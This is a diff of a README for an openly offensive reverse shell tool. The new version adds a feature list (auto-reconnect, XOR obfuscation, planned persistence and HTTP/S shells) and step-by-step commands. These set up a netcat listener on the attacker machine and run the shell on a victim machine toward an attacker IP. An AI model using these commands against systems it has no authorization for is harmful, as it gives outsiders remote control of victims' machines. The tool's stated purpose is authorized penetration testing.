@@ -1,47 +1,88 @@
-# reverseshell
-All in one reverseshell
+# ReverseShell - All-in-One Reverse Shell Tool  
 
+📱 **Developed by [karthithehacker](https://karthithehacker.com)**  
 
+ReverseShell is an advanced reverse shell tool that supports **auto-reconnection, encryption, and cross-platform execution**. It helps security professionals test system defenses and understand shell-based attack vectors.  
 
-<p align="center">
+---
 
+## 🚀 Features  
+- ✅ **Configurable Host & Port** (Command-line arguments)  
+- ✅ **Auto-Reconnect** (If connection drops, it retries after a delay)  
+- ✅ **Basic Encryption** (XOR-based obfuscation for data transfer)  
+- ✅ **Cross-Platform Support** (Works on **Linux** & **Windows**)  
+- ✅ **Error Handling & Logging** (Avoids crashes & logs failures)  
 
+---
 
+## 🔧 Installation & Setup  
 
+### 1⃣ **Clone the Repository**  
+```bash
+ git clone https://github.com/yourusername/reverseshell.git
+ cd reverseshell
+```
 
+### 2⃣ **Run the Listener (Attacker Machine)**  
+On your Kali Linux/ParrotOS, start a Netcat listener:  
+```bash
+ nc -lvnp 4444
+```
 
+### 3⃣ **Execute the Reverse Shell (Victim Machine)**  
+Run the script on the target system:  
+```bash
+ python3 reverseshell.py --host <attacker_ip> --port 4444
+```
 
-## License
+Example:  
+```bash
+ python3 reverseshell.py --host 192.168.1.100 --port 4444
+```
 
-[MIT](https://choosealicense.com/licenses/mit/)
+---
 
+## 🛠 Usage  
 
+### **Basic Reverse Shell**  
+```bash
+ python3 reverseshell.py --host <attacker_ip> --port <port>
+```
 
-## Installation 
+### **With Auto-Reconnect (Retry Every 10s)**  
+```bash
+ python3 reverseshell.py --host <attacker_ip> --port 4444 --reconnect 10
+```
 
- Install Python3 and pip [Instructions Here](https://www.python.org/downloads/) (If you can't figure this out, you shouldn't really be using this)
+### **Windows Payload Example**  
+```powershell
+ python reverseshell.py --host 192.168.1.200 --port 9001
+```
 
-   - To run revershell 
-     - ```bash
-          python3 reverseshell-linux-mac.py
-        ```
-   - Listener 
-     - `nc -lvp 4444`
+---
 
+## 🔥 Roadmap  
+- ✅ **Auto-Reconnect Support**  
+- ✅ **Basic XOR Encryption**  
+- 🚀 **AES Encryption for Secure Shells** (Upcoming)  
+- 🚀 **Support for Reverse HTTP/S Shells**  
+- 🚀 **Automated Persistence Mode**  
 
-## 🔗 Links
-[![Website](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://cappriciosec.com/)
-[![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/karthikeyan--v/)
-[![twitter](https://img.shields.io/badge/twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/karthithehacker)
+---
 
+## ⚠️ Disclaimer  
+**This tool is for educational and authorized penetration testing purposes only.**  
+The developer is not responsible for any misuse or illegal activity conducted with this tool.  
 
+---
 
-## Author
+## 👨‍💻 Author  
+- 💻 Developed by [karthithehacker](https://karthithehacker.com)  
+- 🌍 Website: [karthithehacker.com](https://karthithehacker.com)  
+- 🐦 Twitter: [@karthithehacker](https://twitter.com/karthithehacker)  
+- 📧 Email: [contact@karthithehacker.com](mailto:contact@karthithehacker.com)  
 
-- [@karthithehacker](https://github.com/karthi-the-hacker/)
+---
 
+🌟 **If you like this tool, give it a star!** 🌟
 
-
-## Feedback
-
-If you have any feedback, please reach out to us at contact@karthithehacker.com
